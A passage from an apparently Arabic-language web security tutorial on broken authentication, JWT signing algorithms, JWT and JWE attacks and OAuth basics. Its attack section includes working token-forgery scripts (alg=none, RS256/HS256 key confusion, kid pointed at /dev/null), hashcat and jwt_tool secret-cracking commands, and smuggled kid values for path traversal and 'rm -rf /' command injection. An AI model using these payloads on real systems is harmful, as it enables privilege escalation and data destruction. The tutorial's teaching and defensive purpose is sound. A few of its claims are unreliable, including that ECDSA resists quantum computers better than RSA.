   - استخدام backup codes ضعيفة
   - تخمين backup codes قابلة للتنبؤ

5. SMS Interception:
   - SIM Swapping
   - SS7 attacks
   - Malware على الهاتف
                </div>
            </div>

            <div class="tip">
                <h4><i class="fas fa-lightbulb"></i> نصائح لاكتشاف Broken Authentication</h4>
                <ul class="list">
                    <li><strong>🔍 ابحث عن:</strong> صفحات login، register، forgot password، change password</li>
                    <li><strong>🧪 اختبر:</strong> كلمات مرور ضعيفة، brute force، session hijacking</li>
                    <li><strong>⚠️ راقب:</strong> رسائل الخطأ المختلفة، redirect behavior، cookie values</li>
                    <li><strong>🛠️ استخدم:</strong> Burp Suite، OWASP ZAP، custom scripts</li>
                </ul>
            </div>
        </section>

        <section id="jwt-basics">
            <h2><i class="fas fa-shield-alt"></i> مقدمة JWT: التوقيع (JWS) مقابل التشفير (JWE)</h2>
            
            <p>JSON Web Tokens (JWT) هي معيار مفتوح (RFC 7519) لنقل المعلومات بشكل آمن بين الأطراف. يتكون JWT من ثلاثة أجزاء مفصولة بنقاط، كل جزء مُرمز بـ Base64URL.</p>

            <h3>🔍 بنية JWT الأساسية</h3>
            <div class="code-block">
// بنية JWT الأساسية
JWT = header.payload.signature

// مثال JWT حقيقي
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
            </div>

            <div class="mermaid">
graph TD
    A[JWT Token] --> B[Header<br/>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9]
    A --> C[Payload<br/>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ]
    A --> D[Signature<br/>SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c]
    
    B --> B1[{"alg": "HS256",<br/>"typ": "JWT"}]
    C --> C1[{"sub": "1234567890",<br/>"name": "John Doe",<br/>"iat": 1516239022}]
    D --> D1[HMACSHA256(<br/>base64UrlEncode(header) + "." +<br/>base64UrlEncode(payload),<br/>secret)]
            </div>

            <div class="grid">
                <div class="card">
                    <h3>🏷️ Header (الرأس)</h3>
                    <p>يحتوي على نوع الرمز والخوارزمية المستخدمة:</p>
                    <div class="code-block">
{
  "alg": "HS256",  // الخوارزمية المستخدمة
  "typ": "JWT"     // نوع الرمز
}
                    </div>
                </div>
                <div class="card">
                    <h3>📦 Payload (الحمولة)</h3>
                    <p>يحتوي على البيانات (Claims) المراد نقلها:</p>
                    <div class="code-block">
{
  "sub": "1234567890",    // Subject
  "name": "John Doe",     // Custom claim
  "iat": 1516239022,      // Issued at
  "exp": 1516242622       // Expiration
}
                    </div>
                </div>
                <div class="card">
                    <h3>✍️ Signature (التوقيع)</h3>
                    <p>يضمن سلامة البيانات وعدم تعديلها:</p>
                    <div class="code-block">
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
                    </div>
                </div>
            </div>

            <h3>🔐 JWS مقابل JWE: الفرق الأساسي</h3>
            
            <div class="grid">
                <div class="card">
                    <h4>🖊️ JWS (JSON Web Signature)</h4>
                    <p><strong>الغرض:</strong> ضمان سلامة البيانات (Integrity) والتحقق من المصدر (Authentication)</p>
                    <p><strong>البيانات:</strong> مرئية (Base64URL فقط، ليس تشفير حقيقي)</p>
                    <p><strong>الحماية:</strong> التوقيع الرقمي يمنع التعديل</p>
                    
                    <div class="warn">
                        <strong>تحذير:</strong> البيانات في JWS مرئية لأي شخص يمكنه فك تشفير Base64URL!
                    </div>
                </div>
                
                <div class="card">
                    <h4>🔒 JWE (JSON Web Encryption)</h4>
                    <p><strong>الغرض:</strong> ضمان السرية (Confidentiality) والسلامة معاً</p>
                    <p><strong>البيانات:</strong> مشفرة بالكامل ولا يمكن قراءتها</p>
                    <p><strong>الحماية:</strong> التشفير + المصادقة</p>
                    
                    <div class="tip">
                        <strong>نصيحة:</strong> استخدم JWE عندما تحتاج لإخفاء محتوى البيانات الحساسة
                    </div>
                </div>
            </div>

                        <h3>🔧 خوارزميات JWS الشائعة - شرح تفصيلي</h3>
            
            <p>قبل فهم هجمات JWT، يجب أن نفهم كيف تعمل خوارزميات التشفير. هناك 3 عائلات رئيسية:</p>

            <div class="attack-demo">
                <h4>🔑 1. HMAC (Hash-based Message Authentication Code)</h4>
                <p><strong>الفكرة:</strong> مفتاح واحد مشترك للتوقيع والتحقق</p>
                
                <div class="mermaid">
graph LR
    A[البيانات: header.payload] --> B[HMAC Function]
    C[المفتاح السري] --> B
    B --> D[التوقيع: hash digest]
    
    E[التحقق] --> F[HMAC Function]
    G[نفس المفتاح السري] --> F
    H[البيانات المستلمة] --> F
    F --> I{هل التوقيع متطابق؟}
    I -->|نعم| J[صحيح ✅]
    I -->|لا| K[مزيف ❌]
    
    style C fill:#81c784
    style G fill:#81c784
    style J fill:#e8f5e8
    style K fill:#ffebee
                </div>
                
                <div class="code-block">
# كيف يعمل HMAC داخلياً:

1. خوارزمية SHA (مثل SHA-256)
2. المفتاح السري (مثل "my-secret-key")
3. البيانات (header.payload)

# الحساب:
HMAC-SHA256(data, secret) = SHA256((secret ⊕ opad) || SHA256((secret ⊕ ipad) || data))

# بشكل مبسط:
signature = HMAC-SHA256("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ", "my-secret-key")

# النتيجة:
signature = "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
                </div>
                
                <div class="grid">
                    <div class="card">
                        <h4>HS256 (HMAC + SHA-256)</h4>
                        <ul class="list">
                            <li><strong>الطول:</strong> 256-bit signature</li>
                            <li><strong>السرعة:</strong> سريع جداً</li>
                            <li><strong>الأمان:</strong> قوي إذا كان المفتاح قوي</li>
                            <li><strong>الاستخدام:</strong> التطبيقات البسيطة</li>
                        </ul>
                        <div class="code-block">
// Node.js مثال
const crypto = require('crypto');
const secret = 'my-256-bit-secret';
const data = 'header.payload';

const signature = crypto
  .createHmac('sha256', secret)
  .update(data)
  .digest('base64url');
                        </div>
                    </div>
                    
                    <div class="card">
                        <h4>HS384 (HMAC + SHA-384)</h4>
                        <ul class="list">
                            <li><strong>الطول:</strong> 384-bit signature</li>
                            <li><strong>السرعة:</strong> أبطأ قليلاً من HS256</li>
                            <li><strong>الأمان:</strong> أقوى من HS256</li>
                            <li><strong>الاستخدام:</strong> التطبيقات المتوسطة</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>HS512 (HMAC + SHA-512)</h4>
                        <ul class="list">
                            <li><strong>الطول:</strong> 512-bit signature</li>
                            <li><strong>السرعة:</strong> الأبطأ في عائلة HMAC</li>
                            <li><strong>الأمان:</strong> الأقوى في عائلة HMAC</li>
                            <li><strong>الاستخدام:</strong> التطبيقات عالية الأمان</li>
                        </ul>
                    </div>
                </div>
                
                <div class="danger">
                    <h4>⚠️ نقاط ضعف HMAC</h4>
                    <ul class="list">
                        <li><strong>مشاركة المفتاح:</strong> يجب أن يعرف الجميع نفس المفتاح</li>
                        <li><strong>إدارة المفاتيح:</strong> صعوبة تدوير المفاتيح</li>
                        <li><strong>المفاتيح الضعيفة:</strong> إذا كان المفتاح ضعيف، يمكن كسره</li>
                        <li><strong>تسريب المفتاح:</strong> إذا تسرب المفتاح، كل شيء مكشوف</li>
                    </ul>
                </div>
            </div>

            <div class="attack-demo">
                <h4>🔐 2. RSA (Rivest-Shamir-Adleman)</h4>
                <p><strong>الفكرة:</strong> مفتاحان مختلفان - خاص للتوقيع، عام للتحقق</p>
                
                <div class="mermaid">
graph TD
    A[إنشاء زوج مفاتيح RSA] --> B[المفتاح الخاص<br/>Private Key]
    A --> C[المفتاح العام<br/>Public Key]
    
    D[البيانات: header.payload] --> E[توقيع بالمفتاح الخاص]
    B --> E
    E --> F[التوقيع الرقمي]
    
    G[التحقق] --> H[فك التوقيع بالمفتاح العام]
    C --> H
    F --> H
    D --> I[hash البيانات]
    H --> J[hash من التوقيع]
    I --> K{هل متطابقان؟}
    J --> K
    K -->|نعم| L[صحيح ✅]
    K -->|لا| M[مزيف ❌]
    
    style B fill:#ff9800
    style C fill:#81c784
    style L fill:#e8f5e8
    style M fill:#ffebee
                </div>
                
                <div class="code-block">
# كيف يعمل RSA:

1. إنشاء المفاتيح:
   - اختيار عددين أوليين كبيرين: p, q
   - حساب n = p × q
   - حساب φ(n) = (p-1)(q-1)
   - اختيار e (عادة 65537)
   - حساب d حيث e × d ≡ 1 (mod φ(n))
   
2. المفتاح العام: (n, e)
3. المفتاح الخاص: (n, d)

4. التوقيع:
   signature = (hash(data))^d mod n

5. التحقق:
   hash_from_signature = signature^e mod n
   if hash_from_signature == hash(data): valid
                </div>
                
                <div class="grid">
                    <div class="card">
                        <h4>RS256 (RSA + SHA-256)</h4>
                        <div class="code-block">
// إنشاء مفاتيح RSA
const crypto = require('crypto');
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
});

// التوقيع
const jwt = require('jsonwebtoken');
const token = jwt.sign({ sub: '123', name: 'Ahmed' }, privateKey, { 
  algorithm: 'RS256',
  keyid: 'key-1'
});

// التحقق
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
                        </div>
                    </div>
                    
                    <div class="card">
                        <h4>RS384 & RS512</h4>
                        <ul class="list">
                            <li><strong>RS384:</strong> RSA + SHA-384</li>
                            <li><strong>RS512:</strong> RSA + SHA-512</li>
                            <li><strong>الفرق:</strong> طول hash function</li>
                            <li><strong>الأمان:</strong> RS512 > RS384 > RS256</li>
                        </ul>
                    </div>
                </div>
                
                <div class="tip">
                    <h4>💡 مميزات RSA</h4>
                    <ul class="list">
                        <li><strong>لا حاجة لمشاركة أسرار:</strong> المفتاح العام يمكن نشره</li>
                        <li><strong>إدارة مفاتيح أسهل:</strong> كل طرف له مفاتيحه الخاصة</li>
                        <li><strong>أمان عالي:</strong> صعب كسر المفاتيح الطويلة</li>
                        <li><strong>معيار صناعي:</strong> مستخدم في كل مكان</li>
                    </ul>
                </div>
                
                <div class="warn">
                    <h4>⚠️ عيوب RSA</h4>
                    <ul class="list">
                        <li><strong>بطيء:</strong> أبطأ بكثير من HMAC</li>
                        <li><strong>حجم كبير:</strong> التوقيعات والمفاتيح كبيرة</li>
                        <li><strong>استهلاك طاقة:</strong> يحتاج معالجة أكثر</li>
                        <li><strong>تعقيد التطبيق:</strong> أصعب في التنفيذ</li>
                    </ul>
                </div>
            </div>

            <div class="attack-demo">
                <h4>📐 3. ECDSA (Elliptic Curve Digital Signature Algorithm)</h4>
                <p><strong>الفكرة:</strong> نفس مبدأ RSA لكن باستخدام المنحنيات الإهليلجية</p>
                
                <div class="mermaid">
graph TD
    A[منحنى إهليلجي<br/>y² = x³ + ax + b] --> B[نقطة أساسية G]
    C[مفتاح خاص: d<br/>عدد عشوائي] --> D[مفتاح عام: Q = d × G<br/>نقطة على المنحنى]
    
    E[البيانات] --> F[hash البيانات]
    F --> G[إنشاء k عشوائي]
    G --> H[حساب r = (k × G).x mod n]
    C --> I[حساب s = k⁻¹(hash + r×d) mod n]
    H --> J[التوقيع: (r, s)]
    I --> J
    
    K[التحقق] --> L[حساب u1 = hash × s⁻¹ mod n]
    K --> M[حساب u2 = r × s⁻¹ mod n]
    L --> N[نقطة = u1×G + u2×Q]
    M --> N
    D --> N
    N --> O{هل r == نقطة.x mod n؟}
    O -->|نعم| P[صحيح ✅]
    O -->|لا| Q[مزيف ❌]
    
    style C fill:#ff9800
    style D fill:#81c784
    style P fill:#e8f5e8
    style Q fill:#ffebee
                </div>
                
                <div class="code-block">
# المنحنيات الشائعة:

1. P-256 (secp256r1) - للـ ES256:
   y² = x³ - 3x + b (mod p)
   حيث p = 2²⁵⁶ - 2²²⁴ + 2¹⁹² + 2⁹⁶ - 1

2. P-384 (secp384r1) - للـ ES384:
   مشابه لكن بحجم 384-bit

3. P-521 (secp521r1) - للـ ES512:
   مشابه لكن بحجم 521-bit

# مثال إنشاء مفاتيح ECDSA:
const crypto = require('crypto');
const { publicKey, privateKey } = crypto.generateKeyPairSync('ec', {
  namedCurve: 'secp256k1',  // أو 'prime256v1' للـ P-256
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
});

# التوقيع:
const token = jwt.sign({ sub: '123' }, privateKey, { algorithm: 'ES256' });
                </div>
                
                <div class="grid">
                    <div class="card">
                        <h4>ES256 (ECDSA + P-256 + SHA-256)</h4>
                        <ul class="list">
                            <li><strong>المنحنى:</strong> P-256 (prime256v1)</li>
                            <li><strong>حجم المفتاح:</strong> 256-bit</li>
                            <li><strong>قوة الأمان:</strong> مكافئة لـ RSA 3072-bit</li>
                            <li><strong>السرعة:</strong> أسرع من RSA</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>ES384 & ES512</h4>
                        <ul class="list">
                            <li><strong>ES384:</strong> P-384 + SHA-384</li>
                            <li><strong>ES512:</strong> P-521 + SHA-512</li>
                            <li><strong>ملاحظة:</strong> ES512 يستخدم P-521 وليس P-512</li>
                            <li><strong>الأمان:</strong> أقوى تدريجياً</li>
                        </ul>
                    </div>
                </div>
                
                <div class="tip">
                    <h4>🚀 لماذا ECDSA أفضل؟</h4>
                    <ul class="list">
                        <li><strong>مفاتيح أصغر:</strong> 256-bit ECDSA = 3072-bit RSA</li>
                        <li><strong>سرعة أعلى:</strong> توقيع وتحقق أسرع من RSA</li>
                        <li><strong>استهلاك أقل:</strong> ذاكرة وطاقة أقل</li>
                        <li><strong>مستقبلي:</strong> مقاوم للحاسوب الكمي أكثر من RSA</li>
                    </ul>
                </div>
            </div>

            <div class="attack-demo">
                <h4>⚡ مقارنة سريعة بين الخوارزميات</h4>
                
                <div class="mermaid">
graph TD
    A[اختيار خوارزمية JWT] --> B{نوع التطبيق؟}
    
    B -->|تطبيق بسيط<br/>مفتاح واحد| C[HMAC]
    B -->|تطبيق موزع<br/>عدة خدمات| D[RSA أو ECDSA]
    B -->|أداء عالي<br/>موارد محدودة| E[ECDSA]
    
    C --> F[HS256: سريع وبسيط<br/>HS384/512: أمان أعلى]
    D --> G[RSA: معيار قديم موثوق<br/>ECDSA: حديث وأسرع]
    E --> H[ES256: الأكثر شيوعاً<br/>ES384/512: أمان فائق]
    
    style C fill:#81c784
    style G fill:#42a5f5
    style H fill:#ff9800
                </div>
                
                <div class="code-block">
# جدول مقارنة الأداء:

خوارزمية    | حجم المفتاح | سرعة التوقيع | سرعة التحقق | حجم التوقيع | الأمان
-----------|-------------|-------------|-------------|-------------|--------
HS256      | 256-bit     | ⭐⭐⭐⭐⭐      | ⭐⭐⭐⭐⭐      | 256-bit     | ⭐⭐⭐
HS384      | 384-bit     | ⭐⭐⭐⭐       | ⭐⭐⭐⭐       | 384-bit     | ⭐⭐⭐⭐
HS512      | 512-bit     | ⭐⭐⭐⭐       | ⭐⭐⭐⭐       | 512-bit     | ⭐⭐⭐⭐⭐
RS256      | 2048-bit    | ⭐⭐         | ⭐⭐⭐        | 2048-bit    | ⭐⭐⭐⭐
RS384      | 2048-bit    | ⭐⭐         | ⭐⭐⭐        | 2048-bit    | ⭐⭐⭐⭐⭐
RS512      | 2048-bit    | ⭐⭐         | ⭐⭐⭐        | 2048-bit    | ⭐⭐⭐⭐⭐
ES256      | 256-bit     | ⭐⭐⭐⭐       | ⭐⭐⭐⭐       | 512-bit     | ⭐⭐⭐⭐
ES384      | 384-bit     | ⭐⭐⭐        | ⭐⭐⭐        | 768-bit     | ⭐⭐⭐⭐⭐
ES512      | 521-bit     | ⭐⭐⭐        | ⭐⭐⭐        | 1042-bit    | ⭐⭐⭐⭐⭐

# التوصيات:
✅ للتطبيقات البسيطة: HS256
✅ للتطبيقات الموزعة: ES256
✅ للأمان العالي: ES384 أو HS512
✅ للتوافق القديم: RS256
                </div>
            </div>

            <h3>🔐 خوارزميات JWE المتقدمة</h3>
            
            <div class="grid">
                <div class="card">
                    <h4>Key Management Algorithms</h4>
                    <ul class="list">
                        <li><strong>RSA-OAEP:</strong> RSA مع OAEP padding</li>
                        <li><strong>RSA-OAEP-256:</strong> نسخة محسنة بـ SHA-256</li>
                        <li><strong>ECDH-ES:</strong> Elliptic Curve Diffie-Hellman</li>
                        <li><strong>A256KW:</strong> AES Key Wrap</li>
                    </ul>
                </div>
                
                <div class="card">
                    <h4>Content Encryption Algorithms</h4>
                    <ul class="list">
                        <li><strong>A256GCM:</strong> AES-256-GCM (مُوصى به)</li>
                        <li><strong>A128GCM:</strong> AES-128-GCM</li>
                        <li><strong>A256CBC-HS512:</strong> AES-256-CBC + HMAC-SHA512</li>
                    </ul>
                </div>
            </div>

            <div class="tip">
                <h4>💡 متى تستخدم كل نوع؟</h4>
                <ul class="list">
                    <li><strong>JWS:</strong> للتحقق من سلامة البيانات العامة (مثل معلومات المستخدم الأساسية)</li>
                    <li><strong>JWE:</strong> للبيانات الحساسة (مثل كلمات المرور، أرقام البطاقات الائتمانية)</li>
                    <li><strong>JWS + HTTPS:</strong> الحل الأكثر شيوعاً للتطبيقات العادية</li>
                    <li><strong>JWE:</strong> للبيانات الحساسة جداً أو التخزين طويل المدى</li>
                </ul>
            </div>
        </section>

        <section id="jwt-attacks">
            <h2><i class="fas fa-bomb"></i> هجمات JWT (JWS) - الأكثر خطورة وشيوعاً</h2>
            
            <p>JWT يحتوي على عيوب أمنية خطيرة إذا لم يُطبق بشكل صحيح. هذه الهجمات تستغل ضعف التحقق من التوقيع أو سوء إدارة المفاتيح.</p>

            <div class="danger">
                <h4>⚠️ تحذير مهم</h4>
                <p>معظم هجمات JWT تحدث بسبب أخطاء في التطبيق وليس في المعيار نفسه. دائماً تحقق من التوقيع وتحقق من الخوارزمية المستخدمة!</p>
            </div>

            <h3>🚫 هجمة None Algorithm - الأخطر والأسهل</h3>
            
            <div class="attack-demo">
                <h4>🎯 كيف تعمل الهجمة؟</h4>
                <p>المهاجم يغير الخوارزمية إلى "none" ويحذف التوقيع، والخادم الضعيف يقبل الرمز بدون تحقق!</p>
                
                <div class="code-block">
// JWT الأصلي (صحيح)
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "user123",
  "role": "user",
  "exp": 1640995200
}
[signature]

// JWT المُخترق (none algorithm)
{
  "alg": "none",    // ← تغيير الخوارزمية
  "typ": "JWT"
}
{
  "sub": "user123",
  "role": "admin",  // ← تغيير الصلاحية!
  "exp": 1940995200 // ← تمديد انتهاء الصلاحية
}
// بدون توقيع!
                </div>
                
                <h4>🛠️ كود الاستغلال العملي</h4>
                <div class="code-block">
import base64
import json

# إنشاء header جديد
header = {
    "alg": "none",
    "typ": "JWT"
}

# تعديل payload لإعطاء صلاحيات admin
payload = {
    "sub": "user123",
    "role": "admin",  # تغيير من user إلى admin
    "iat": 1640995200,
    "exp": 1940995200  # تمديد الصلاحية لسنوات
}

# ترميز Base64URL
header_b64 = base64.urlsafe_b64encode(
    json.dumps(header).encode()
).decode().rstrip('=')

payload_b64 = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).decode().rstrip('=')

# JWT بدون توقيع
malicious_jwt = f"{header_b64}.{payload_b64}."
print(f"Malicious JWT: {malicious_jwt}")
                </div>
            </div>

            <h3>🔀 Key Confusion Attack - استغلال الخوارزميات المختلطة</h3>
            
            <div class="attack-demo">
                <h4>🎯 المشكلة: RS256 → HS256 Confusion</h4>
                <p>الخادم يستخدم RS256 (مفتاح عام/خاص) لكن المهاجم يخدعه لاستخدام HS256 (مفتاح مشترك) مع المفتاح العام!</p>
                
                <div class="mermaid">
sequenceDiagram
    participant A as المهاجم
    participant S as الخادم
    participant K as JWKS Endpoint
    
    A->>K: GET /.well-known/jwks.json
    K->>A: {"keys": [{"kty": "RSA", "n": "public_key_data"}]}
    
    Note over A: يستخدم المفتاح العام كـ HMAC secret
    A->>A: HMAC-SHA256(data, public_key)
    A->>S: JWT مع alg: "HS256"
    
    Note over S: الخادم يستخدم المفتاح العام كـ HMAC secret
    S->>S: تحقق ناجح! ✓
    S->>A: تم قبول JWT المزيف
                </div>
                
                <h4>🛠️ كود الاستغلال</h4>
                <div class="code-block">
import requests
import jwt
import json
from cryptography.hazmat.primitives import serialization

# 1. تحميل المفتاح العام من JWKS
jwks_url = "https://target.com/.well-known/jwks.json"
jwks = requests.get(jwks_url).json()

# 2. استخراج المفتاح العام
public_key_data = jwks['keys'][0]
# تحويل JWK إلى PEM format
public_key_pem = jwk_to_pem(public_key_data)

# 3. إنشاء payload خبيث
payload = {
    "sub": "victim_user",
    "role": "admin",      # ترقية الصلاحيات
    "iat": 1640995200,
    "exp": 1940995200
}

# 4. توقيع بـ HS256 باستخدام المفتاح العام
malicious_token = jwt.encode(
    payload, 
    public_key_pem,       # المفتاح العام كـ HMAC secret!
    algorithm='HS256'     # تغيير من RS256 إلى HS256
)

print(f"Malicious Token: {malicious_token}")
                </div>
            </div>

            <h3>💉 KID (Key ID) Injection - استغلال معرف المفتاح</h3>
            
            <div class="attack-demo">
                <h4>🎯 العيب: استخدام kid لقراءة الملفات</h4>
                <p>عندما يستخدم الخادم قيمة "kid" من header لتحديد مسار ملف المفتاح، يمكن للمهاجم التلاعب بالمسار!</p>
                
                <div class="code-block">
// Header طبيعي
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1"  // الخادم يقرأ: /keys/key1
}

// Header مُخترق - Path Traversal
{
  "alg": "HS256", 
  "typ": "JWT",
  "kid": "../../../../etc/passwd"  // قراءة ملف النظام!
}

// Header مُخترق - /dev/null
{
  "alg": "HS256",
  "typ": "JWT", 
  "kid": "../../../../dev/null"  // مفتاح فارغ = توقيع فارغ
}

// Header مُخترق - Command Injection
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1; rm -rf /"  // إذا كان يُمرر للـ shell!
}
                </div>
                
                <h4>🛠️ استغلال /dev/null</h4>
                <div class="code-block">
import jwt
import json
import base64

# إنشاء JWT مع kid يشير لـ /dev/null
header = {
    "alg": "HS256",
    "typ": "JWT", 
    "kid": "../../../../dev/null"  # سيقرأ الخادم محتوى فارغ
}

payload = {
    "sub": "attacker",
    "role": "admin",
    "exp": 1940995200
}

# توقيع بمفتاح فارغ (لأن /dev/null فارغ)
empty_key = ""
token = jwt.encode(payload, empty_key, algorithm='HS256', headers=header)
                </div>
            </div>

            <h3>🔓 Weak Secret Attack - كسر المفاتيح الضعيفة</h3>
            
            <div class="attack-demo">
                <h4>🎯 المشكلة: مفاتيح HMAC ضعيفة</h4>
                <p>كثير من المطورين يستخدمون مفاتيح ضعيفة أو افتراضية يمكن كسرها بالقوة الغاشمة!</p>
                
                <div class="code-block">
// أمثلة على مفاتيح ضعيفة شائعة
"secret"
"password" 
"123456"
"jwt_secret"
"your-256-bit-secret"
"mySecretKey"
""  // مفتاح فارغ!
                </div>
                
                <h4>🛠️ كسر JWT بـ Hashcat</h4>
                <div class="code-block">
# حفظ JWT في ملف
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" > jwt.txt

# كسر بـ Hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# أو استخدام john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt

# أو استخدام jwt_tool
python3 jwt_tool.py -C -d /usr/share/wordlists/rockyou.txt jwt.txt
                </div>
                
                <h4>🛠️ إنشاء JWT جديد بعد كسر المفتاح</h4>
                <div class="code-block">
import jwt

# المفتاح الذي تم كسره
cracked_secret = "secret"

# إنشاء payload جديد بصلاحيات admin
admin_payload = {
    "sub": "attacker",
    "role": "admin", 
    "iat": 1640995200,
    "exp": 1940995200
}

# إنشاء JWT جديد
admin_token = jwt.encode(admin_payload, cracked_secret, algorithm='HS256')
print(f"Admin Token: {admin_token}")
                </div>
            </div>

            <div class="tip">
                <h4>🛡️ كيف تحمي نفسك من هجمات JWT؟</h4>
                <ul class="list">
                    <li><strong>رفض "none" تماماً:</strong> لا تقبل alg="none" أبداً</li>
                    <li><strong>تحديد الخوارزميات المسموحة:</strong> whitelist صارم للخوارزميات</li>
                    <li><strong>ربط الخوارزمية بالمفتاح:</strong> منع Key Confusion</li>
                    <li><strong>تنظيف kid:</strong> whitelist أو regex للتحقق من kid</li>
                    <li><strong>مفاتيح قوية:</strong> 256-bit عشوائية للـ HMAC</li>
                    <li><strong>تدوير المفاتيح:</strong> تغيير دوري للمفاتيح</li>
                </ul>
            </div>
        </section>

        <section id="jwe-attacks">
            <h2><i class="fas fa-lock"></i> هجمات JWE (التشفير)</h2>
            <div class="grid">
                <div class="card">
                    <h3>RSA1_5 Padding Oracles</h3>
                    <ul class="list">
                        <li>العيب: استخدام RSA1_5 القديم دون OAEP</li>
                        <li>الاستغلال: فك شفرة تدريجياً عبر ردود الخطأ</li>
                        <li>الحماية: استخدام RSA-OAEP-256 أو ECDH-ES + GCM</li>
                    </ul>
                </div>
                <div class="card">
                    <h3>AES-CBC + HMAC Misuse</h3>
                    <ul class="list">
                        <li>العيب: تحقق سلامة غير صحيح → CBC bit flipping</li>
                        <li>الاستغلال: تعديل المحتوى المشفر</li>
                        <li>الحماية: AEAD مثل A256GCM (مصادَق)</li>
                    </ul>
                </div>
                <div class="card">
                    <h3>KDF/Key Agreement أخطاء</h3>
                    <ul class="list">
                        <li>العيب: اشتقاق مفاتيح ضعيف في ECDH-ES</li>
                        <li>الاستغلال: إعادة استخدام nonces/IVs</li>
                        <li>الحماية: مكتبات موثوقة، إدارة مفاتيح صحيحة</li>
                    </ul>
                </div>
            </div>
        </section>

        <section id="oauth-basics">
            <h2><i class="fab fa-osi"></i> أساسيات OAuth 2.0 - شرح مفصل للمبتدئين</h2>
            
            <p>مرحباً بكم في عالم OAuth 2.0! 🌍 تخيل أنك تريد أن تسمح لتطبيق آخر بالوصول لصورك في Google Photos بدون إعطائه كلمة مرور Google الخاصة بك. هذا بالضبط ما يحل OAuth 2.0!</p>

            <div class="tip">
                <h4><i class="fas fa-lightbulb"></i> ما هو OAuth 2.0؟</h4>
                <p><strong>OAuth 2.0</strong> هو إطار عمل للتفويض (Authorization Framework) وليس للمصادقة. يسمح للتطبيقات بالحصول على وصول محدود لحساب المستخدم دون الحاجة لكلمة المرور.</p>
                <ul class="list">
                    <li>🔑 <strong>ليس للمصادقة:</strong> لا يخبرك من هو المستخدم</li>
                    <li>🔐 <strong>للتفويض:</strong> يخبرك ما يمكن للتطبيق فعله</li>
                    <li>🛡️ <strong>آمن:</strong> لا يكشف كلمة مرور المستخدم</li>
                    <li>⏰ <strong>محدود الوقت:</strong> Access tokens تنتهي صلاحيتها</li>
                </ul>
            </div>

            <h3><i class="fas fa-users"></i> الأدوار الأربعة في OAuth 2.0</h3>
            
            <div class="mermaid">
graph TD
    A[👤 Resource Owner<br/>صاحب البيانات<br/>المستخدم] --> B[📱 Client<br/>التطبيق الذي يريد الوصول<br/>مثل: تطبيق تعديل الصور]
    
    C[🔐 Authorization Server<br/>خادم التفويض<br/>مثل: Google OAuth] --> D[📊 Resource Server<br/>خادم البيانات<br/>مثل: Google Photos API]
    
    A -.->|يملك البيانات| D
    B -.->|يريد الوصول| D
    C -.->|يحمي| D
    
    style A fill:#81c784
    style B fill:#42a5f5
    style C fill:#ff9800
    style D fill:#e91e63
            </div>

            <div class="grid">
                <div class="card">
                    <h4>👤 Resource Owner (صاحب البيانات)</h4>
                    <p><strong>من هو:</strong> المستخدم النهائي الذي يملك البيانات</p>
                    <ul class="list">
                        <li><strong>المثال:</strong> أنت كمستخدم Google</li>
                        <li><strong>البيانات:</strong> صورك، إيميلاتك، جهات اتصالك</li>
                        <li><strong>السلطة:</strong> يقرر من يصل لبياناته</li>
                        <li><strong>الفعل:</strong> يوافق أو يرفض طلبات الوصول</li>
                    </ul>
                </div>
                
                <div class="card">
                    <h4>📱 Client (التطبيق/العميل)</h4>
                    <p><strong>ما هو:</strong> التطبيق الذي يريد الوصول لبيانات المستخدم</p>
                    <ul class="list">
                        <li><strong>المثال:</strong> تطبيق Canva، Spotify، Instagram</li>
                        <li><strong>الهدف:</strong> الوصول لبيانات المستخدم لتقديم خدمة</li>
                        <li><strong>أنواع:</strong> Public (mobile apps) أو Confidential (web apps)</li>
                        <li><strong>المعرف:</strong> له client_id وأحياناً client_secret</li>
                    </ul>
                </div>
                
                <div class="card">
                    <h4>🔐 Authorization Server (خادم التفويض)</h4>
                    <p><strong>ما هو:</strong> الخادم الذي يتحقق من هوية المستخدم ويصدر tokens</p>
                    <ul class="list">
                        <li><strong>المثال:</strong> accounts.google.com، login.microsoftonline.com</li>
                        <li><strong>الوظائف:</strong> تسجيل دخول، إصدار tokens، التحقق من الصلاحيات</li>
                        <li><strong>النهايات:</strong> /authorize، /token، /userinfo</li>
                        <li><strong>الأمان:</strong> يحمي عملية التفويض</li>
                    </ul>
                </div>
                
                <div class="card">
                    <h4>📊 Resource Server (خادم البيانات)</h4>
                    <p><strong>ما هو:</strong> الخادم الذي يحتوي على بيانات المستخدم المحمية</p>
                    <ul class="list">
